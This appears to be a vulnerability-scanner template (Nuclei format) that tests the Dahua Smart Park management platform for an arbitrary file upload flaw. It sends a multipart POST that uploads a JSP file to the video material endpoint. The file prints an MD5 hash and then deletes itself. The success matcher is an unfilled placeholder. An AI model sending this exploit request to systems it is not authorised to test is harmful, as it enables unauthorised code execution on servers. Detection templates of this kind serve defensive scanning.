script_name: 大华智慧园区综合管理平台 文件上传漏洞
content:
id: custom-file-upload-vulnerability

info:
  name: Custom File Upload Vulnerability Test
  author: yourname
  severity: high
  description: Tests for arbitrary file upload vulnerability at /publishing/publishing/material/file/video endpoint.
  tags: fileupload,cve

requests:
  - method: POST
    path:
      - "{{BaseURL}}/publishing/publishing/material/file/video"

    headers:
      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
      Content-Type: multipart/form-data; boundary=dd8f988919484abab3816881c55272a7
      Accept-Encoding: gzip, deflate
      Connection: close

    body: |
      --dd8f988919484abab3816881c55272a7
      Content-Disposition: form-data; name="Filedata"; filename="0EaE10E7dF5F10C2.jsp"
      
      <%@page contentType="text/html; charset=GBK"%><%@page import="java.math.BigInteger"%><%@page import="java.security.MessageDigest"%><% MessageDigest md5 = null;md5 = MessageDigest.getInstance("MD5");String s = "123456";String miyao = "";String jiamichuan = s + miyao;md5.update(jiamichuan.getBytes());String md5String = new BigInteger(1, md5.digest()).toString(16);out.println(md5String);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
      --dd8f988919484abab3816881c55272a7
      Content-Disposition: form-data; name="poc"
      
      poc
      --dd8f988919484abab3816881c55272a7
      Content-Disposition: form-data; name="Submit"
      
      submit
      --dd8f988919484abab3816881c55272a7--

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "specific_success_indicator" # Replace with actual success indicator from response
        part: body

      - type: status
        status:
          - 200
author: 无垢
online_script_name: 大华智慧园区综合管理平台 文件上传漏洞
